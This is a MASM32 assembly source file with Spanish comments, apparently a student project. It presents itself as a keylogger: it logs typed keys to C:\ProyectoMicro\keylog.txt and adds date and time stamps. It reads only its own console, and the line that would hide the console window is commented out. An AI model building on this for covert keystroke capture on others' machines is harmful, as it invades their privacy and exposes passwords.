.386 
.model flat,stdcall 
option casemap:none 
include \masm32\include\windows.inc 
include \masm32\include\user32.inc 
includelib \masm32\lib\user32.lib
include \masm32\include\kernel32.inc 
includelib \masm32\lib\kernel32.lib

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\masm32.inc
include \masm32\include\masm32rt.inc
include \masm32\include\user32.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib
includelib \masm32\lib\user32.lib

.DATA

;ESCRITURA
formatoFecha DB "dd-MM-yyyy", 0
formatoHora DB " hh:mm:ss ", 0

LecturaBytes DD 100
EscrituraBytes DD 15
DIEZ DB 10
textoErroneo DB "No esta correcto",0
textoCorrecto DB "Esta Correcto",0
Archivo byte "C:\ProyectoMicro\keylog.txt", NULL
saltoLinea DB 13, 10,0

;LECTURA
fecha db " Fecha: ",0
bufffecha db 8
hora db " Hora: ",0
buffHora db 7
slash db "/",0
puntos db ":",0


.DATA?
AUX DW ?
tecla dd ?, 0
imprimir DB ?, 0
;BufferLectura DW ?
;ESCRITURA
fechaBuf DB 50 dup(?)
horaBuf DB 50 dup(?)

LeerDe dd ?
hFile HANDLE ?
EscribirA dd ?

;LECTURA

.CODE
Inicio: 
	
	;esconde la consola
	;invoke GetConsoleWindow
	;invoke ShowWindow,eax,0
	;XOR EAX, EAX

	;LLAMA EL PROCEDIMIENTO PARA CREAR EL ARCHIVO
	CALL CREARARCHIVO

	LEERTECLADO:
		;INVOKE StdIn, addr tecla, 1
		call crt__getch
		mov tecla, eax
		;printf("\nYou pressed key number %d", tecla)
		;SE MUEVE LA ENTRADA AL REGISTRO EAX
		;MOV AL, tecla		
		
		;SE COMPARA SI ES UN ENTER
		CMP tecla, 13
		JE ObtenerFechaHora	
		;SE COMPARA SI ES UN ESPACIO
		CMP tecla, 32						
		JE ObtenerFechaHora
		
		INVOKE WriteFile, hFile, ADDR tecla, 1, ADDR EscrituraBytes, NULL
		
		JMP LEERTECLADO

		ObtenerFechaHora:
		call FECHA
		JMP LEERTECLADO
					



	FINALIZAR:
    ;INVOKE MessageBox,NULL, ADDR textoErroneo, ADDR textoErroneo,MB_OK
    INVOKE ExitProcess,0

	CREARARCHIVO PROC

	    invoke CreateFile,addr Archivo,GENERIC_READ OR GENERIC_WRITE,FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
		MOV hFile, EAX
		; Compara el handle con 0 y verifica si es correcto
		CMP hFile, INVALID_HANDLE_VALUE
		; Si fue incorrecto, salta al procedimiento siguiente, sino continua
		JE ERRORFILE
		JMP FIN
		ERRORFILE:
		INVOKE MessageBox,NULL, ADDR textoErroneo, ADDR textoErroneo,MB_OK
		FIN:
		;INVOKE MessageBox, NULL, ADDR textoCorrecto, ADDR textoCorrecto, MB_OK
		; Escribe dentro del archivo
		;INVOKE WriteFile, hFile, ADDR BufferLectura, LecturaBytes, ADDR EscrituraBytes, NULL
		RET
	CREARARCHIVO ENDP

	FECHA PROC
		;Fecha
		INVOKE WriteFile, hFile, ADDR fecha, bufffecha, ADDR EscrituraBytes, NULL
		INVOKE GetDateFormat, 0,0, \
		0, ADDR formatoFecha, ADDR fechaBuf, 50
		INVOKE WriteFile, hFile, ADDR fechaBuf, 10, ADDR EscrituraBytes, NULL
	
		;Hora
		INVOKE WriteFile, hFile, ADDR hora, buffHora, ADDR EscrituraBytes, NULL
		INVOKE GetTimeFormat, 0,0, \
		0, ADDR formatoHora, ADDR horaBuf, 50 
		INVOKE WriteFile, hFile, ADDR horaBuf, 9, ADDR EscrituraBytes, NULL

		INVOKE WriteFile, hFile, ADDR saltoLinea, 2, ADDR EscrituraBytes, NULL

	
	RET 
	FECHA ENDP

end Inicio